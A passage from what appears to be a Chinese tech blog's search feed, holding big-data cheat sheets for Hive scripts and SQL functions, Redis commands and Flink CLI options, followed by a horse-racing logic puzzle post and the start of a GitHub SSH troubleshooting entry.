&quot;$server2pid&quot; ] &amp;&amp; eval $cmd || echo &quot;HiveServer2服务已启动&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hive_stop()</span><br><span class="line">&#123;</span><br><span class="line">    metapid=$(check_process HiveMetastore 9083)</span><br><span class="line">    [ &quot;$metapid&quot; ] &amp;&amp; kill $metapid || echo &quot;Metastore服务未启动&quot;</span><br><span class="line">    server2pid=$(check_process HiveServer2 10000)</span><br><span class="line">    [ &quot;$server2pid&quot; ] &amp;&amp; kill $server2pid || echo &quot;HiveServer2服务未启动&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)</span><br><span class="line">    hive_start</span><br><span class="line">    ;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">    hive_stop</span><br><span class="line">    ;;</span><br><span class="line">&quot;restart&quot;)</span><br><span class="line">    hive_stop</span><br><span class="line">    sleep 2</span><br><span class="line">    hive_start</span><br><span class="line">    ;;</span><br><span class="line">&quot;status&quot;)</span><br><span class="line">    check_process HiveMetastore 9083 &gt;/dev/null &amp;&amp; echo &quot;Metastore服务运行正常&quot; || echo &quot;Metastore服务运行异常&quot;</span><br><span class="line">    check_process HiveServer2 10000 &gt;/dev/null &amp;&amp; echo &quot;HiveServer2服务运行正常&quot; || echo &quot;HiveServer2服务运行异常&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo Invalid Args!</span><br><span class="line">    echo &#x27;Usage: &#x27;$(basename $0)&#x27; start|stop|restart|status&#x27;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h3 id="常用交互命令"><a href="#常用交互命令" class="headerlink" title="常用交互命令"></a>常用交互命令</h3><table><thead><tr><th>功能说明</th><th>命令</th></tr></thead><tbody><tr><td>不进入hive的交互窗口执行sql</td><td>bin/hive -e “sql语句”</td></tr><tr><td>执行脚本中sql语句</td><td>bin/hive -f hive.sql</td></tr><tr><td>退出hive窗口</td><td>exit 或 quit</td></tr><tr><td>命令窗口中查看hdfs文件系统</td><td>dfs -ls /</td></tr><tr><td>命令窗口中查看hdfs文件系统</td><td>! ls /data/h</td></tr></tbody></table><h3 id="SQL类-特殊的"><a href="#SQL类-特殊的" class="headerlink" title="SQL类(特殊的)"></a>SQL类(特殊的)</h3><table><thead><tr><th>说明</th><th>语句</th></tr></thead><tbody><tr><td>查看hive中的所有数据库</td><td>show databases</td></tr><tr><td>用default数据库</td><td>use default</td></tr><tr><td>查询表结构</td><td>desc table_name</td></tr><tr><td>查看数据库</td><td>show databases</td></tr><tr><td>重命名表名</td><td>alter table table1 rename to table2</td></tr><tr><td>修改表中字段</td><td>alter table table_name change name user_name String</td></tr><tr><td>修改字段类型</td><td>alter table table_name change salary salary Double</td></tr><tr><td>创建外部表</td><td>create external table ….</td></tr><tr><td>查询外部表信息</td><td>desc formatted outsidetable</td></tr><tr><td>创建视图</td><td>create view view_name as select * from table_name …..</td></tr><tr><td>添加数据</td><td>load data local inpath ‘xxx’  overwrite into table table_name partition(day=’2021-12-01’)</td></tr></tbody></table><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>（1） NVL</p><p>给值为NULL的数据赋值，它的格式是NVL( value，default_value)。它的功能是如果value为NULL，则NVL函数返回default_value的值，否则返回value的值，如果两个参数都为NULL ，则返回NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select nvl(column, 0) from xxx；</span><br></pre></td></tr></table></figure><p>（2）行转列</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>CONCAT(string A/col, string B/col…)</td><td>返回输入字符串连接后的结果，支持任意个输入字符串</td></tr><tr><td>CONCAT_WS(separator, str1, str2,…)</td><td>第一个参数参数间的分隔符，如果分隔符是 NULL，返回值也将为 NULL。这个函数会跳过分隔符参数后的任何 NULL 和空字符串。分隔符将被加到被连接的字符串之间。</td></tr><tr><td>COLLECT_SET(col)</td><td>将某字段的值进行去重汇总，产生array类型字段</td></tr><tr><td>COLLECT_LIST(col)</td><td>函数只接受基本数据类型，它的主要作用是将某字段的值进行不去重汇总，产生array类型字段。</td></tr></tbody></table><p>（3）列转行(一列转多行)</p><p><strong>Split(str, separator)：</strong> 将字符串按照后面的分隔符切割，转换成字符array。</p><p><strong>EXPLODE(col)：</strong><br>将hive一列中复杂的array或者map结构拆分成多行。</p><p><strong>LATERAL VIEW</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line"></span><br><span class="line">LATERAL VIEW udtf(expression) tableAlias AS columnAlias</span><br></pre></td></tr></table></figure><p>解释：lateral view用于和split, explode等UDTF一起使用，它能够将一行数据拆成多行数据，在此基础上可以对拆分后的数据进行聚合。</p><p>lateral view首先为原始表的每行调用UDTF，UDTF会把一行拆分成一或者多行，lateral view再把结果组合，产生一个支持别名表的虚拟表。</p><p><strong>准备数据源测试</strong></p><table><thead><tr><th>movie</th><th>category</th></tr></thead><tbody><tr><td>《功勋》</td><td>记录,剧情</td></tr><tr><td>《战狼2》</td><td>战争,动作,灾难</td></tr></tbody></table><p><strong>SQL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT movie,category_name </span><br><span class="line">FROM movie_info </span><br><span class="line">lateral VIEW</span><br><span class="line">explode(split(category,&quot;,&quot;)) movie_info_tmp  AS category_name ;</span><br></pre></td></tr></table></figure><p><strong>测试结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">《功勋》      记录</span><br><span class="line">《功勋》      剧情</span><br><span class="line">《战狼2》     战争</span><br><span class="line">《战狼2》     动作</span><br><span class="line">《战狼2》     灾难</span><br></pre></td></tr></table></figure><h3 id="窗口函数"><a href="#窗口函数" class="headerlink" title="窗口函数"></a>窗口函数</h3><p>（1）OVER()</p><p>定分析函数工作的数据窗口大小，这个数据窗口大小可能会随着行的变而变化。</p><p>（2）CURRENT ROW（当前行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n PRECEDING：往前n行数据</span><br><span class="line"></span><br><span class="line">n FOLLOWING：往后n行数据</span><br></pre></td></tr></table></figure><p>（3）UNBOUNDED（无边界）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNBOUNDED PRECEDING 前无边界，表示从前面的起点</span><br><span class="line"></span><br><span class="line">UNBOUNDED FOLLOWING后无边界，表示到后面的终点</span><br></pre></td></tr></table></figure><p><strong>SQL案例：由起点到当前行的聚合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between UNBOUNDED PRECEDING and current row) </span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p><strong>SQL案例：当前行和前面一行做聚合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between 1 PRECEDING and current row) </span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p><strong>SQL案例：当前行和前面一行和后一行做聚合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between 1 PRECEDING AND 1 FOLLOWING )</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p><strong>SQL案例：当前行及后面所有行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between current row and UNBOUNDED FOLLOWING  )</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p>（4）LAG(col,n,default_val)</p><p>往前第n行数据，没有的话default_val</p><p>（5）LEAD(col,n, default_val)</p><p>往后第n行数据，没有的话default_val</p><p><strong>SQL案例：查询用户购买明细以及上次的购买时间和下次购买时间</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">user_id,,pay_time,money,</span><br><span class="line"></span><br><span class="line">lag(pay_time,1,&#x27;1970-01-01&#x27;) over(PARTITION by name order by pay_time) prev_time,</span><br><span class="line"></span><br><span class="line">lead(pay_time,1,&#x27;1970-01-01&#x27;) over(PARTITION by name order by pay_time) next_time</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p>（6）FIRST_VALUE(col,true/false)</p><p>当前窗口下的第一个值，第二个参数为true，跳过空值。</p><p>（7）LAST_VALUE (col,true/false)</p><p>当前窗口下的最后一个值，第二个参数为true，跳过空值。</p><p><strong>SQL案例：查询用户每个月第一次的购买时间 和 每个月的最后一次购买时间</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">FIRST_VALUE(pay_time) </span><br><span class="line">    over(</span><br><span class="line">        partition by user_id,month(pay_time) order by pay_time </span><br><span class="line">        rows between UNBOUNDED PRECEDING and UNBOUNDED FOLLOWING</span><br><span class="line">        ) first_time,</span><br><span class="line"></span><br><span class="line">LAST_VALUE(pay_time) </span><br><span class="line">    over(partition by user_id,month(pay_time) order by pay_time rows between UNBOUNDED PRECEDING and UNBOUNDED FOLLOWING</span><br><span class="line">    ) last_time</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p>（8）NTILE(n)</p><p>把有序窗口的行分发到指定数据的组中，各个组有编号，编号从1开始，对于每一行，NTILE返回此行所属的组的编号。（用于将分组数据按照顺序切分成n片，返回当前切片值）</p><p><strong>SQL案例：查询前25%时间的订单信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from (</span><br><span class="line">    select User_id,pay_time,money,</span><br><span class="line">    </span><br><span class="line">    ntile(4) over(order by pay_time) sorted</span><br><span class="line">    </span><br><span class="line">    from or_order</span><br><span class="line">) t</span><br><span class="line">where sorted = 1;</span><br></pre></td></tr></table></figure><h3 id="4个By"><a href="#4个By" class="headerlink" title="4个By"></a>4个By</h3><p>（1）Order By</p><p>全局排序，只有一个Reducer。</p><p>（2）Sort By</p><p>分区内有序。</p><p>（3）Distrbute By</p><p>类似MR中Partition，进行分区，结合sort by使用。</p><p>（4） Cluster By</p><p>当Distribute by和Sorts by字段相同时，可以使用Cluster by方式。Cluster by除了具有Distribute by的功能外还兼具Sort by的功能。但是排序只能是升序排序，不能指定排序规则为ASC或者DESC。</p><p>在生产环境中Order By用的比较少，容易导致OOM。</p><p>在生产环境中Sort By+ Distrbute By用的多。</p><h3 id="排序函数"><a href="#排序函数" class="headerlink" title="排序函数"></a>排序函数</h3><p>（1）RANK()</p><p>排序相同时会重复，总数不会变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>（2）DENSE_RANK()</p><p>排序相同时会重复，总数会减少</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>（3）ROW_NUMBER()</p><p>会根据顺序计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p>datediff：返回结束日期减去开始日期的天数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">datediff(string enddate, string startdate) </span><br><span class="line"></span><br><span class="line">select datediff(&#x27;2021-11-20&#x27;,&#x27;2021-11-22&#x27;)</span><br></pre></td></tr></table></figure><p>date_add：返回开始日期startdate增加days天后的日期</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date_add(string startdate, int days) </span><br><span class="line"></span><br><span class="line">select date_add(&#x27;2021-11-20&#x27;,3)</span><br></pre></td></tr></table></figure><p>date_sub：返回开始日期startdate减少days天后的日期</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date_sub (string startdate, int days) </span><br><span class="line"></span><br><span class="line">select date_sub(&#x27;2021-11-22&#x27;,3)</span><br></pre></td></tr></table></figure><hr><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><h3 id="启动类-1"><a href="#启动类-1" class="headerlink" title="启动类"></a>启动类</h3><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>keys  *</td><td>查看当前库的所有键</td></tr><tr><td>exists</td><td>判断某个键是否存在</td></tr><tr><td>type</td><td>查看键的类型</td></tr><tr><td>del</td><td>删除某个键</td></tr><tr><td>expire</td><td>为键值设置过期时间，单位秒</td></tr><tr><td>ttl</td><td>查看还有多久过期,-1表示永不过期,-2表示已过期</td></tr><tr><td>dbsize</td><td>查看当前数据库中key的数量</td></tr><tr><td>flushdb</td><td>清空当前库</td></tr><tr><td>Flushall</td><td>通杀全部库</td></tr></tbody></table><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>get</td><td>查询对应键值</td></tr><tr><td>set</td><td>添加键值对</td></tr><tr><td>append</td><td>将给定的追加到原值的末尾</td></tr><tr><td>strlen</td><td>获取值的长度</td></tr><tr><td>setnx</td><td>只有在key 不存在时设置key的值</td></tr><tr><td>incr</td><td>将key中存储的数字值增1只能对数字值操作，如果为空，新增值为1</td></tr><tr><td>decr</td><td>将key中存储的数字值减1只能对数字之操作，如果为空,新增值为-1</td></tr><tr><td>incrby /decrby  步长</td><td>将key中存储的数字值增减，自定义步长</td></tr><tr><td>mset</td><td>同时设置一个或多个key-value对</td></tr><tr><td>mget</td><td>同时获取一个或多个value</td></tr><tr><td>msetnx</td><td>同时设置一个或多个key-value对，当且仅当所有给定的key都不存在</td></tr><tr><td>getrange  &lt;起始位置&gt; &lt;结束位置&gt;</td><td>获得值的范围,类似java中的substring</td></tr><tr><td>setrange  &lt;起始位置&gt;</td><td>用覆盖所存储的字符串值，从&lt;起始位置&gt;开始</td></tr><tr><td>setex  &lt;过期时间&gt;</td><td>设置键值的同时，设置过去时间，单位秒</td></tr><tr><td>getset</td><td>以新换旧,设置了新值的同时获取旧值</td></tr></tbody></table><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>lpush/rpush</td><td>从左边/右边插入一个或多个值。</td></tr><tr><td>lpop/rpop</td><td>从左边/右边吐出一个值。值在键在，值光键亡。</td></tr><tr><td>rpoplpush</td><td>从列表右边吐出一个值，插到列表左边</td></tr><tr><td>lrange</td><td>按照索引下标获得元素(从左到右)</td></tr><tr><td>lindex</td><td>按照索引下标获得元素(从左到右)</td></tr><tr><td>llen</td><td>获得列表长度</td></tr><tr><td>linsert   before</td><td>在的后面插入 插入值</td></tr><tr><td>lrem</td><td>从左边删除n个value(从左到右)</td></tr></tbody></table><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>sadd      ….</td><td>将一个或多个 member 元素加入到集合 key 当中，已经存在于集合的 member 元素将被忽略。</td></tr><tr><td>smembers</td><td>取出该集合的所有值。</td></tr><tr><td>sismember</td><td>判断集合是否为含有该值，有返回1，没有返回0</td></tr><tr><td>scard</td><td>返回该集合的元素个数。</td></tr><tr><td>srem    ….</td><td>删除集合中的某个元素。</td></tr><tr><td>spop</td><td>随机从该集合中吐出一个值。</td></tr><tr><td>srandmember</td><td>随机从该集合中取出n个值。不会从集合中删除</td></tr><tr><td>sinter</td><td>返回两个集合的交集元素。</td></tr><tr><td>sunion</td><td>返回两个集合的并集元素。</td></tr><tr><td>sdiff</td><td>返回两个集合的差集元素。</td></tr></tbody></table><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>hset</td><td>给集合中的  键赋值</td></tr><tr><td>hget</td><td>从集合 取出 value</td></tr><tr><td>hmset      …</td><td>批量设置hash的值</td></tr><tr><td>hexists key</td><td>查看哈希表 key 中，给定域 field 是否存在。</td></tr><tr><td>hkeys</td><td>列出该hash集合的所有field</td></tr><tr><td>hvals</td><td>列出该hash集合的所有value</td></tr><tr><td>hincrby</td><td>为哈希表 key 中的域 field 的值加上增量 increment</td></tr><tr><td>hsetnx</td><td>将哈希表 key 中的域 field 的值设置为 value ，当且仅当域 field 不存在</td></tr></tbody></table><h3 id="zset-Sorted-set"><a href="#zset-Sorted-set" class="headerlink" title="zset(Sorted set)"></a>zset(Sorted set)</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>zadd       …</td><td>将一个或多个 member 元素及其 score 值加入到有序集 key 当中</td></tr><tr><td>zrange      [WITHSCORES]</td><td>返回有序集 key 中，下标在 之间的元素带WITHSCORES，可以让分数一起和值返回到结果集。</td></tr><tr><td>zrangebyscore key min max [withscores] [limit offset count]</td><td>返回有序集 key 中，所有 score 值介于 min 和 max 之间(包括等于 min 或 max )的成员。有序集成员按 score 值递增(从小到大)次序排列。</td></tr><tr><td>zrevrangebyscore key max min [withscores] [limit offset count]</td><td>同上，改为从大到小排列。</td></tr><tr><td>zincrby</td><td>为元素的score加上增量</td></tr><tr><td>zrem</td><td>删除该集合下，指定值的元素</td></tr><tr><td>zcount</td><td>统计该集合，分数区间内的元素个数</td></tr><tr><td>zrank</td><td>返回该值在集合中的排名，从0开始。</td></tr></tbody></table><hr><h2 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./start-cluster.sh</span><br></pre></td></tr></table></figure><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink run [OPTIONS]</span><br><span class="line"></span><br><span class="line">./bin/flink run -m yarn-cluster -c com.wang.flink.WordCount /opt/app/WordCount.jar</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>功能说明</th></tr></thead><tbody><tr><td>-d</td><td>detached 是否使用分离模式</td></tr><tr><td>-m</td><td>jobmanager 指定提交的jobmanager</td></tr><tr><td>-yat</td><td>–yarnapplicationType 设置yarn应用的类型</td></tr><tr><td>-yD</td><td>使用给定属性的值</td></tr><tr><td>-yd</td><td>–yarndetached 使用yarn分离模式</td></tr><tr><td>-yh</td><td>–yarnhelp yarn session的帮助</td></tr><tr><td>-yid</td><td>–yarnapplicationId 挂到正在运行的yarnsession上</td></tr><tr><td>-yj</td><td>–yarnjar Flink jar文件的路径</td></tr><tr><td>-yjm</td><td>–yarnjobManagerMemory jobmanager的内存(单位M)</td></tr><tr><td>-ynl</td><td>–yarnnodeLabel 指定 YARN 应用程序 YARN 节点标签</td></tr><tr><td>-ynm</td><td>–yarnname 自定义yarn应用名称</td></tr><tr><td>-yq</td><td>–yarnquery 显示yarn的可用资源</td></tr><tr><td>-yqu</td><td>–yarnqueue 指定yarn队列</td></tr><tr><td>-ys</td><td>–yarnslots 指定每个taskmanager的slots数</td></tr><tr><td>-yt</td><td>yarnship 在指定目录中传输文件</td></tr><tr><td>-ytm</td><td>–yarntaskManagerMemory 每个taskmanager的内存</td></tr><tr><td>-yz</td><td>–yarnzookeeperNamespace 用来创建ha的zk子路径的命名空间</td></tr><tr><td>-z</td><td>–zookeeperNamespace 用来创建ha的zk子路径的命名空间</td></tr><tr><td>-p</td><td>并行度</td></tr><tr><td>-yn</td><td>需要分配的YARN容器个数(=任务管理器的数量)</td></tr></tbody></table><h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink info [OPTIONS]</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>功能说明</th></tr></thead><tbody><tr><td>-c</td><td>程序进入点，主类</td></tr><tr><td>-p</td><td>并行度</td></tr></tbody></table><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink list [OPTIONS]</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>功能说明</th></tr></thead><tbody><tr><td>-a</td><td>–all 显示所有应用和对应的job id</td></tr><tr><td>-r</td><td>–running 显示正在运行的应用和job id</td></tr><tr><td>-s</td><td>–scheduled 显示调度的应用和job id</td></tr><tr><td>-m</td><td>–jobmanager 指定连接的jobmanager</td></tr><tr><td>-yid</td><td>–yarnapplicationId 挂到指定的yarn id对应的yarn session上</td></tr><tr><td>-z</td><td>–zookeeperNamespace 用来创建ha的zk子路径的命名空间</td></tr></tbody></table><h3 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink stop  [OPTIONS] &lt;Job ID&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>功能说明</th></tr></thead><tbody><tr><td>-d</td><td>在采取保存点和停止管道之前，发送MAX_WATERMARK</td></tr><tr><td>-p</td><td>savepointPath 保存点的路径 ‘xxxxx’</td></tr><tr><td>-m</td><td>–jobmanager 指定连接的jobmanager</td></tr><tr><td>-yid</td><td>–yarnapplicationId 挂到指定的yarn id对应的yarn session上</td></tr><tr><td>-z</td><td>–zookeeperNamespace 用来创建ha的zk子路径的命名空间</td></tr></tbody></table><h3 id="cancel-弱化"><a href="#cancel-弱化" class="headerlink" title="cancel(弱化)"></a>cancel(弱化)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink cancel  [OPTIONS] &lt;Job ID&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>功能说明</th></tr></thead><tbody><tr><td>-s</td><td>使用 “stop “代替</td></tr><tr><td>-D</td><td>允许指定多个通用配置选项</td></tr><tr><td>-m</td><td>要连接的JobManager的地址</td></tr><tr><td>-yid</td><td>–yarnapplicationId 挂到指定的yarn id对应的yarn session上</td></tr><tr><td>-z</td><td>–zookeeperNamespace 用来创建ha的zk子路径的命名空间</td></tr></tbody></table><h3 id="savepoint"><a href="#savepoint" class="headerlink" title="savepoint"></a>savepoint</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink savepoint  [OPTIONS] &lt;Job ID&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>功能说明</th></tr></thead><tbody><tr><td>-d</td><td>要处理的保存点的路径</td></tr><tr><td>-j</td><td>Flink程序的JAR文件</td></tr><tr><td>-m</td><td>要连接的JobManager的地址</td></tr><tr><td>-yid</td><td>–yarnapplicationId 挂到指定的yarn id对应的yarn session上</td></tr><tr><td>-z</td><td>–zookeeperNamespace 用来创建ha的zk子路径的命名空间</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> BIGDATA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bigdata </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智力题之赛马问题</title>
      <link href="/2021/11/02/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/"/>
      <url>/2021/11/02/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1KJ411g78y&cid=118835090&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="赛马问题"><a href="#赛马问题" class="headerlink" title="赛马问题"></a>赛马问题</h2><h3 id="64匹马8个跑道"><a href="#64匹马8个跑道" class="headerlink" title="64匹马8个跑道"></a>64匹马8个跑道</h3><p>64匹马8个跑道（不计时），问最少要比多少次，才能知道最快的4匹马<br><img src="http://106.12.125.218/medias/medias/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/0.png"><br>​</p><p>首先要赛8+1场，得到上表中的相对顺序<br>A1&gt;A2&gt;…&gt;A8<br>B1&gt;B2&gt;…&gt;B8<br>…<br>H1&gt;H2&gt;…&gt;H8<br>A1&gt;B1&gt;…&gt;H1<br>​</p><p>可以知道第一名已经确定了，第2-4名只可能在红色区域出现（如：D2&lt;D1&lt;C1&lt;B1&lt;A1,所以D2一定不是前四）<br>​</p><p>红色区域共有9匹马，取出A2，让剩下8匹马赛一场，如果A3第一，则前4已经确定了共8+1+1=10场，如果A3不是第一，则还需要让这一场的前三名和A2赛一场，共8+1+1+1=11场<br>​</p><p>所以最少10场，最多11场</p><h3 id="36匹马6个跑道"><a href="#36匹马6个跑道" class="headerlink" title="36匹马6个跑道"></a>36匹马6个跑道</h3><p><img src="http://106.12.125.218/medias/medias/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/1.png"><br>先赛6 + 1场得到上表<br>然后让红色区域再赛一场就可以确定前三名了<br>​</p><p>所以共6 + 1 + 1 = 8场<br>​</p><p>同理<br>25匹马5赛道，赛出前3名<br>需要5 + 1 + 1 = 7场</p><blockquote><p><a href="https://blog.csdn.net/qq_43827595/article/details/104154641">https://blog.csdn.net/qq_43827595/article/details/104154641</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> INTERESTING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智力题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github配置SSH-key时出现Permission-denied(publickey)</title>
      <link href="/2021/11/01/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/"/>
      <url>/2021/11/01/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/</url>
      
